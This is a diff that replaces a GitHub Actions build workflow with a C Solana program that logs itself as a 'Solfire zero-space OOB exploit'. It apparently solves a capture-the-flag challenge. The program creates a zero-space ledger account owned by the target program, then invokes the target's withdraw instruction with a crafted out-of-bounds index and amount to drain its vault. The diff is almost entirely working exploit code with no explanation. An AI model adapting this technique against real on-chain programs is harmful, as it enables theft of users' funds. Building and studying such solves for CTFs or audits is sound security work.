@@ -1,30 +1,207 @@
-name: Build solfire
+#include <solana_sdk.h>
 
-on:
-  workflow_dispatch:
+#define CLOCK    0
+#define SYSTEM   1
+#define LEDGER   2
+#define VAULT    3
+#define USER     4
+#define SOLFIRE  5
 
-jobs:
-  build:
-    runs-on: ubuntu-latest
+#define BALANCE_INDEX 0x280
+#define WITHDRAW_AMT  0x10000
 
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+static void solfire_create(
+    SolParameters *params,
+    uint8_t ledger_nonce
+)
+{
+    sol_log("crEate!");
 
-      - name: Build
-        run: docker build -t solfire-solve .
+    const SolSignerSeed seed = {
+        &ledger_nonce,
+        1
+    };
 
-      - name: Run build
-        run: docker run --rm -v "$PWD:/work" solfire-solve
+    const SolSignerSeeds signer_seeds = {
+        &seed,
+        1
+    };
 
-      - name: Find solve.so
-        run: |
-          echo "Searching for solve.so..."
-          find . -name "solve.so" -type f -print
+    SolAccountMeta meta[] = {
+        {
+            (SolPubkey *)params->ka[USER].key,
+            1,
+            1
+        },
+        {
+            (SolPubkey *)params->ka[LEDGER].key,
+            1,
+            1
+        }
+    };
 
-      - name: Upload solve.so
-        uses: actions/upload-artifact@v4
-        with:
-          name: solve-so
-          path: |
-            **/solve.so
+    /*
+     * System CreateAccount:
+     *
+     * instruction = 0
+     * lamports    = 1
+     * space       = 0
+     * owner       = solfire
+     */
+    uint8_t buf[0x34] = {0};
+
+    buf[0] = 0;
+
+    /* 1 lamport */
+    buf[4] = 1;
+
+    /* 0 data bytes */
+    buf[12] = 0;
+
+    /* solfire program is owner */
+    sol_memcpy(
+        &buf[20],
+        params->ka[SOLFIRE].key,
+        32
+    );
+
+    SolInstruction instruction = {
+        (SolPubkey *)params->ka[SYSTEM].key,
+        meta,
+        2,
+        buf,
+        sizeof(buf)
+    };
+
+    sol_invoke_signed(
+        &instruction,
+        params->ka,
+        params->ka_num,
+        &signer_seeds,
+        1
+    );
+}
+
+static void solfire_withdraw(
+    SolParameters *params,
+    uint8_t vault_nonce
+)
+{
+    sol_log("withDraw!");
+
+    SolAccountMeta meta[] = {
+        {
+            (SolPubkey *)params->ka[CLOCK].key,
+            0,
+            0
+        },
+        {
+            (SolPubkey *)params->ka[SYSTEM].key,
+            0,
+            0
+        },
+        {
+            (SolPubkey *)params->ka[LEDGER].key,
+            1,
+            0
+        },
+        {
+            (SolPubkey *)params->ka[USER].key,
+            1,
+            1
+        },
+        {
+            (SolPubkey *)params->ka[VAULT].key,
+            1,
+            0
+        }
+    };
+
+    /*
+     * Withdraw input is 16 bytes:
+     *
+     * [0..3]   opcode = 2
+     * [4..7]   index  = 0x280
+     * [8..11]  amount = 0x10000
+     * [12]     vault nonce
+     */
+    uint8_t buf[16] = {0};
+
+    buf[0] = 2;
+
+    buf[4] = 0x80;
+    buf[5] = 0x02;
+
+    buf[8]  = 0x00;
+    buf[9]  = 0x00;
+    buf[10] = 0x01;
+
+    buf[12] = vault_nonce;
+
+    SolInstruction instruction = {
+        (SolPubkey *)params->ka[SOLFIRE].key,
+        meta,
+        5,
+        buf,
+        sizeof(buf)
+    };
+
+    sol_invoke(
+        &instruction,
+        params->ka,
+        params->ka_num
+    );
+}
+
+static uint64_t basic(
+    SolParameters *params
+)
+{
+    uint8_t ledger_nonce = params->data[0];
+    uint8_t vault_nonce  = params->data[1];
+
+    solfire_create(
+        params,
+        ledger_nonce
+    );
+
+    solfire_withdraw(
+        params,
+        vault_nonce
+    );
+
+    return SUCCESS;
+}
+
+extern uint64_t entrypoint(
+    const uint8_t *input
+)
+{
+    sol_log(
+        "Solfire zero-space OOB exploit"
+    );
+
+    SolAccountInfo accounts[6];
+
+    SolParameters params = {
+        .ka = accounts
+    };
+
+    if (!sol_deserialize(
+        input,
+        &params,
+        6
+    )) {
+        return ERROR_INVALID_ARGUMENT;
+    }
+
+    if (params.ka_num < 6) {
+        return ERROR_NOT_ENOUGH_ACCOUNT_KEYS;
+    }
+
+    if (params.data_len < 2) {
+        return ERROR_INVALID_ARGUMENT;
+    }
+
+    return basic(&params);
+}
